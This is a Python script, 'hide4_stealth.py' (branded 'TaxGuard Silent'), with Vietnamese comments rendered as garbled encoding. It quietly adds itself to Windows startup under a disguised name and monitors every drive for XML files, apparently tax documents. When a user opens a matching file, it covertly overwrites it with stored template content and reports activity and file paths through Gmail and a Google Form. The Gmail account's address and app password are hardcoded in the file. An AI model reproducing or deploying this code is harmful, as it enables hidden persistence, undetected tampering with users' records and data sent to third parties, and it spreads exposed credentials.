# hide4_stealth.py - STEALTH MODE

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (ch·ªâ d√πng khi --gui)
import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Th∆∞ m·ª•c l∆∞u config/log/state --- #
APP_DIR     = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE  = APP_DIR / 'processed_files.pkl'
LOG_FILE    = APP_DIR / 'xml_overwrite.log'
REMOTE_CONF = APP_DIR / 'remote_config.json'
SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'

# --- Logging UTF-8 v√†o file --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def create_fortress_db():
    """T·∫°o database fortress ƒë·ªÉ l∆∞u tr·ªØ file g·ªëc kh√¥ng th·ªÉ x√≥a."""
    db_path = APP_DIR / 'fortress.db'
    conn = sqlite3.connect(str(db_path))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS original_files (
            file_hash TEXT PRIMARY KEY,
            file_name TEXT,
            file_content BLOB,
            created_time TEXT,
            last_verified TEXT
        )
    ''')
    conn.commit()
    conn.close()
    return db_path

def store_original_file(file_path, content):
    """L∆∞u file g·ªëc v√†o fortress database kh√¥ng th·ªÉ x√≥a."""
    try:
        file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        conn.execute('''
            INSERT OR REPLACE INTO original_files 
            (file_hash, file_name, file_content, created_time, last_verified)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            file_hash,
            os.path.basename(file_path),
            content.encode('utf-8'),
            datetime.now().isoformat(),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        logging.info(f"üîí ƒê√£ l∆∞u file g·ªëc v√†o fortress: {file_path}")
        return file_hash
    except Exception as e:
        logging.error(f"‚ùå L·ªói l∆∞u fortress: {e}")
        return None

def restore_from_fortress(file_path):
    """Kh√¥i ph·ª•c file t·ª´ fortress database."""
    try:
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        cursor = conn.execute(
            'SELECT file_content FROM original_files WHERE file_name = ? ORDER BY created_time DESC LIMIT 1',
            (os.path.basename(file_path),)
        )
        result = cursor.fetchone()
        
        if result:
            restored_content = result[0].decode('utf-8')
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(restored_content)
            conn.close()
            logging.info(f"üîç Stealth restore: {file_path}")
            return True
        
        conn.close()
        return False
    except Exception as e:
        logging.error(f"‚ùå L·ªói kh√¥i ph·ª•c fortress: {e}")
        return False

def load_sent_logs():
    """T·∫£i danh s√°ch c√°c log ƒë√£ g·ª≠i t·ª´ file."""
    if SENT_LOGS_FILE.exists():
        with open(SENT_LOGS_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_sent_logs(sent_logs):
    """L∆∞u danh s√°ch c√°c log ƒë√£ g·ª≠i."""
    with open(SENT_LOGS_FILE, 'wb') as f:
        pickle.dump(sent_logs, f)

def add_to_startup():
    """Th√™m ch√≠nh EXE v√†o HKCU Run ƒë·ªÉ auto-startup kh√¥ng UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "TaxGuard_Silent", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info(f"üîç Stealth startup enabled")
    except Exception as e:
        logging.error(f"‚ùå Th√™m v√†o Startup th·∫•t b·∫°i: {e}")

def load_remote_config():
    """Hardcoded remote config for Gmail and Google Form."""
    return {
        "gmail": {
            "from": "begau1302@gmail.com",
            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
            "app_password": "aphvukdliewalkrn"
        },
        "google_form": {
            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
            "entry_id": "entry.1791266121"
        }
    }

def send_gmail_log(to_email, subject, content, from_email, app_password):
    try:
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(content)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        logging.info("üîç Stealth alert sent")
    except Exception as e:
        logging.error(f"‚ùå G·ª≠i Gmail th·∫•t b·∫°i: {e}")

def send_googleform_log(form_url, entry_id, message):
    try:
        data = { entry_id: message }
        response = requests.post(form_url, data=data)
        if response.status_code == 200:
            logging.info("üîç Stealth form log sent")
        else:
            logging.warning(f"‚ùå L·ªói g·ª≠i Form: {response.status_code}")
    except Exception as e:
        logging.error(f"‚ùå G·ª≠i Form th·∫•t b·∫°i: {e}")

def send_remote_log(event, path=None, once=False):
    """G·ª≠i log v·ªÅ Google Form v√† Gmail, ch·ªâ g·ª≠i m·ªôt l·∫ßn n·∫øu once=True."""
    sent_logs = load_sent_logs()
    msg = f"[{event}] - {path or ''}"
    log_key = f"{event}:{path or ''}"
    
    if once and log_key in sent_logs:
        return
    
    cfg = load_remote_config()

    if "gmail" in cfg:
        g = cfg["gmail"]
        send_gmail_log(g["to"], f"Stealth Log: {event}", msg, g["from"], g["app_password"])

    if "google_form" in cfg:
        f = cfg["google_form"]
        send_googleform_log(f["form_url"], f["entry_id"], msg)

    if once:
        sent_logs.add(log_key)
        save_sent_logs(sent_logs)

def get_templates():
    """L·∫•y t·∫•t c·∫£ file XML trong th∆∞ m·ª•c 'templates/' v√† l∆∞u v√†o fortress."""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    
    # L∆∞u t·∫•t c·∫£ templates v√†o fortress ƒë·ªÉ b·∫£o v·ªá tuy·ªát ƒë·ªëi
    for tpl in templates:
        try:
            with open(tpl, 'r', encoding='utf-8') as f:
                content = f.read()
            store_original_file(tpl, content)
        except Exception as e:
            logging.error(f"‚ùå L·ªói l∆∞u template v√†o fortress: {e}")
    
    return templates

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

class StealthHandler(FileSystemEventHandler):
    """STEALTH MODE: Gi√°m s√°t √¢m th·∫ßm v√† ch·ªâ ghi ƒë√® khi file ƒë∆∞·ª£c truy c·∫≠p."""
    def __init__(self, templates_map):
        super().__init__()
        self.templates = templates_map
        self.processed = load_processed_files()
        self.stealth_targets = set()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            self.stealth_analyze(event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            self.stealth_analyze(event.dest_path)

    def on_opened(self, event):
        """Khi file ƒë∆∞·ª£c m·ªü - th·ªùi ƒëi·ªÉm ho√†n h·∫£o ƒë·ªÉ ghi ƒë√® √¢m th·∫ßm."""
        if not event.is_directory and event.src_path.endswith('.xml'):
            if event.src_path in self.stealth_targets:
                self.stealth_overwrite(event.src_path)

    def stealth_analyze(self, dest):
        """Ph√¢n t√≠ch √¢m th·∫ßm - kh√¥ng l√†m g√¨ ch·ªâ ghi nh·∫≠n."""
        try:
            matching_template = self.find_matching_template_content(dest)
            if matching_template:
                # ƒê√¢y l√† file gi·∫£ - th√™m v√†o danh s√°ch stealth
                self.stealth_targets.add(dest)
                logging.info(f"üîç Stealth: Ph√°t hi·ªán file gi·∫£ {dest}")
        except Exception as e:
            logging.error(f"üîç Stealth analyze error: {e}")

    def find_matching_template_content(self, dest):
        """T√¨m template ph√π h·ª£p m√† kh√¥ng ƒë·ªçc to√†n b·ªô file."""
        try:
            with open(dest, 'r', encoding='utf-8') as f:
                content = f.read(200)  # Ch·ªâ ƒë·ªçc 200 k√Ω t·ª± ƒë·∫ßu
            return self.find_matching_template(content)
        except:
            return None

    def find_matching_template(self, xml_content):
        """T√¨m template ph√π h·ª£p d·ª±a tr√™n n·ªôi dung XML."""
        try:
            # Parse XML ƒë·ªÉ l·∫•y c√°c th√¥ng tin ƒë·ªãnh danh
            root = ET.fromstring(xml_content)
            
            # T√¨m message ID ho·∫∑c c√°c th√¥ng tin ƒë·ªãnh danh kh√°c
            msg_id = None
            for elem in root.iter():
                if 'messageId' in elem.attrib:
                    msg_id = elem.attrib['messageId']
                    break
                elif elem.tag.endswith('messageId'):
                    msg_id = elem.text
                    break
            
            if msg_id:
                # Th·ª≠ t√¨m theo message ID truy·ªÅn th·ªëng
                for template_path in self.templates.values():
                    if msg_id in os.path.basename(template_path):
                        return template_path
            
            return None
            
        except Exception as e:
            logging.error(f"‚ùå L·ªói ph√¢n t√≠ch XML: {e}")
            return None

    def stealth_overwrite(self, dest):
        """STEALTH OVERWRITE: Ghi ƒë√® √¢m th·∫ßm khi user m·ªü file."""
        try:
            # Kh√¥i ph·ª•c t·ª´ fortress
            if restore_from_fortress(dest):
                # Ch·ªâ g·ª≠i log n·ªôi b·ªô √≠t nh·∫•t
                if hasattr(self, '_last_stealth_log'):
                    if (datetime.now() - self._last_stealth_log).seconds < 3600:
                        return  # Ch·ªâ log 1 l·∫ßn/gi·ªù
                        
                self._last_stealth_log = datetime.now()
                send_remote_log("üîç Stealth protection active", "", once=True)
                
        except Exception as e:
            logging.error(f"üîç Stealth error: {e}")

def start_monitor():
    """STEALTH MODE: B·∫£o v·ªá √¢m th·∫ßm v√† gi√°m s√°t to√†n PC."""
    send_remote_log("üîç Stealth mode activated", once=True)
    add_to_startup()
    
    # T·∫°o c∆° s·ªü d·ªØ li·ªáu fortress
    create_fortress_db()
    logging.info("üîç Fortress Database ready")

    templates = get_templates()
    tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }

    handler  = StealthHandler(tpl_map)
    observer = Observer()
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    logging.info(f"üîç Stealth monitoring {len(drives)} drives")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        send_remote_log("üîç Stealth mode deactivated", once=True)
    except Exception as e:
        logging.error(f"‚ùå Ph·∫ßn m·ªÅm g·∫∑p l·ªói: {e}")
    observer.join()

def launch_gui():
    """GUI mode: xem templates & log (khi ch·∫°y v·ªõi --gui)."""
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("TaxGuard Silent - GUI")
    root.geometry("600x500")

    # List templates
    lb_tpl = Listbox(root, height=5)
    for p in get_templates():
        lb_tpl.insert(END, p)
    lb_tpl.pack(fill='x', padx=10, pady=(10,5))

    lbl = ctk.CTkLabel(root, text="Danh s√°ch XML g·ªëc (templates) v√† log g·∫ßn nh·∫•t:")
    lbl.pack(pady=5)

    lb_log = Listbox(root)
    sb     = Scrollbar(root, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=(10,0), pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()